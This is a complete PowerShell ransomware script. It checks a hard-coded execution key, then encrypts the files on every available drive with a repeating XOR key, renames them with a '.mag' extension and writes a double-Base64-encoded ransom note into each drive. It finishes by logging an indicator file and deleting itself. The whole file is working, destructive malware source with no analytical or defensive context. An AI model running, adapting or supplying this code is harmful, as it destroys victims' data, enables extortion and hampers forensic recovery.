function Decode-Base64-Twice {
    param (
        [string]$Base64String
    )
    try {
        $FirstDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64String))
        $SecondDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($FirstDecoded))
        return $SecondDecoded
    } catch {
        Write-Host "Failed to decode Base64 string. Ensure the input is valid." -ForegroundColor Red
        return $null
    }
}

function Create-RansomNote {
    param (
        [string]$TargetDirectory,
        [string]$NoteContent
    )
    $NotePath = Join-Path -Path $TargetDirectory -ChildPath "readme.txt"
    [System.IO.File]::WriteAllText($NotePath, $NoteContent)
    Write-Host "Ransom note created: $NotePath" -ForegroundColor Green
}

function XOR-EncryptDecrypt {
    param (
        [byte[]]$Data,
        [string]$Key
    )
    $KeyLength = $Key.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Data[$i] = $Data[$i] -bxor [byte][char]$Key[$i % $KeyLength]
    }
    return $Data
}

function XOR-File {
    param (
        [string]$FilePath,
        [string]$Key
    )
    $Data = [System.IO.File]::ReadAllBytes($FilePath)
    $EncryptedData = XOR-EncryptDecrypt -Data $Data -Key $Key
    [System.IO.File]::WriteAllBytes($FilePath, $EncryptedData)
}

function Generate-MD5-Hash {
    param (
        [string]$Value
    )
    $MD5 = [System.Security.Cryptography.MD5]::Create()
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Value)
    $HashBytes = $MD5.ComputeHash($Bytes)
    $Hash = [BitConverter]::ToString($HashBytes) -replace "-", ""
    return $Hash.ToLower()
}

function Derive-EncryptionKey {
    $HashValue = Generate-MD5-Hash -Value "1777"
    $DerivedKey = $HashValue.Substring($HashValue.Length - 4, 4)
    return $DerivedKey
}

function Validate-ExecutionKey {
    param (
        [string]$ExecutionKey
    )
    if ($ExecutionKey -ne "1777") {
        Write-Host "Invalid execution key! The script will not proceed." -ForegroundColor Red
        return $false
    }
    return $true
}

function Get-AvailableDrives {
    $Drives = @()
    foreach ($Drive in ([char]'A'..[char]'Z')) {
        $Path = "${Drive}:\"
        if (Test-Path -Path $Path) {
            $Drives += $Path
        }
    }
    return $Drives
}

function Encrypt-Files {
    param (
        [string]$EncryptionKey,
        [string[]]$TargetDirectories
    )

    # Write an indicator file to the root directory of each target
    $IndicatorFile = "C:\encryption_indicator.txt"
    Add-Content -Path $IndicatorFile -Value "Encryption started at $(Get-Date)" -Force

    Write-Host "=== Encryption Process Started ===" -ForegroundColor Red

    foreach ($TargetDirectory in $TargetDirectories) {
        Write-Host "Encrypting files in directory: $TargetDirectory" -ForegroundColor Yellow
        Get-ChildItem -Path $TargetDirectory -Recurse -File | ForEach-Object {
            $FilePath = $_.FullName
            $NewFilePath = "${FilePath}.mag"
            try {
                XOR-File -FilePath $FilePath -Key $EncryptionKey
                Rename-Item -Path $FilePath -NewName $NewFilePath
                Write-Host "Encrypted: $NewFilePath" -ForegroundColor Cyan
            } catch {
                Write-Host "Failed to encrypt ${FilePath}: $_" -ForegroundColor Yellow
            }
        }

        # Create a ransom note in the directory
        Create-RansomNote -TargetDirectory $TargetDirectory -NoteContent $DecodedNote
    }

    Write-Host "=== Encryption Process Completed ===" -ForegroundColor Green

    # Append to the indicator file
    Add-Content -Path $IndicatorFile -Value "Encryption completed at $(Get-Date)" -Force
}

function Self-Delete {
    param (
        [string]$ScriptPath = $MyInvocation.MyCommand.Path
    )

    if (-not $ScriptPath) {
        Write-Host "Script path is null. Self-delete cannot proceed." -ForegroundColor Yellow
        return
    }

    try {
        Remove-Item -Path $ScriptPath -Force
        Write-Host "Script $ScriptPath has been deleted." -ForegroundColor Green
    } catch {
        Write-Host "Failed to delete script: $_" -ForegroundColor Yellow
    }
}

function Main {
    param (
        [string]$ExecutionKey
    )

    if (-not (Validate-ExecutionKey -ExecutionKey $ExecutionKey)) {
        return
    }

    # Replace with a valid Base64 string
    $Base64String = "SVNFaElFOVBVRk1zSUZkRklFUkpSQ0JCSUZSSVNVNUhJQ0VoSVFvS1NHa2dkR2hsY21Vc0lIUm9hWE1nYVhNZ2VXOTFjaUJtY21sbGJtUnNlU0J1WldsbmFHSnZjbWh2YjJRZ0treGxlbUZ5ZFhNcUlHZHliM1Z3SVNBZ0NsZGxJRzFoZVNCdmNpQnRZWGtnYm05MElHaGhkbVVnWVdOamFXUmxiblJoYkd4NUlHVnVZM0o1Y0hSbFpDQjViM1Z5SUdacGJHVnpMaUJYYUc5dmNITnBaU0VnOEorWWhTQWdDZ3BDZFhRZ1pHOXU0b0NaZENCM2IzSnllU3dnZDJVZ1kyRnVJSFJ2ZEdGc2JIa2dabWw0SUhSb2FYUGlnS1lnWm05eUlIUm9aU0J6YldGc2JDQndjbWxqWlNCdlppQXFLakV3TUNCQ1ZFTXFLaTRnSUFwWGFIa2dNVEF3SUVKVVF6OGdWMlZzYkN3Z2QyVWdibVZsWkNCamIyWm1aV1VzSUhOdVlXTnJjeXdnWVc1a0lHMWhlV0psSUdFZ2RISnZjR2xqWVd3Z2RtRmpZWFJwYjI0dUlDQUtDbE5sYm1RZ2VXOTFjaUIwYjNSaGJHeDVJR2RsYm1WeWIzVnpJR1J2Ym1GMGFXOXVJR2hsY21VNklDQUtLaW94VEdWYVlYSlZjMEpVUTJGa1JGSkZVMU14TWpNME5UWTNPRGt3S2lvS0NrOXVZMlVnZVc5MUozSmxJR1psWld4cGJtY2daMlZ1WlhKdmRYTXNJR1Z0WVdsc0lIVnpJR0YwSUNvcWMzVndjRzl5ZEVCc1pYcGhjblZ6TG5oNWVpb3FMaUFnQ2xkbDRvQ1piR3dnYzJWdVpDQjViM1VnZEdobElHMWhaMmxqSUhKbFkybHdaU0IwYnlCblpYUWdlVzkxY2lCbWFXeGxjeUJpWVdOckxpQWdDZ3BRTGxNdUlFbG1JSGx2ZFNCMGNua2dkRzhnWW5KbFlXc2diM1Z5SUdWdVkzSjVjSFJwYjI0c0lIZGw0b0NaYkd3Z2FuVnpkQ0JzWVhWbmFDQmlaV05oZFhObExDQjNaV3hzTENCdFlYUm9JR2x6SUdoaGNtUXVJQ0FLQ2toaGRtVWdZU0JuY21WaGRDQmtZWGtzSUdGdVpDQmtiMjdpZ0psMElHWnZjbWRsZENCMGJ5QmlZV05ySUhWd0lIbHZkWElnWm1sc1pYTWdibVY0ZENCMGFXMWxJU0R3bjVpSklDQUtMU0JNYjNabExDQk1aWHBoY25WeklPS2RwTys0andvPQ=="

    $DecodedNote = Decode-Base64-Twice -Base64String $Base64String
    if ($DecodedNote -eq $null) {
        Write-Host "Exiting script due to invalid Base64 note." -ForegroundColor Red
        return
    }

    $EncryptionKey = Derive-EncryptionKey

    # Get all available drives
    $AvailableDrives = Get-AvailableDrives
    Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $AvailableDrives

    # Pass the script's path explicitly
    Self-Delete -ScriptPath $MyInvocation.MyCommand.Path
}

# Execute the script with the provided execution key
Main -ExecutionKey $args[0]
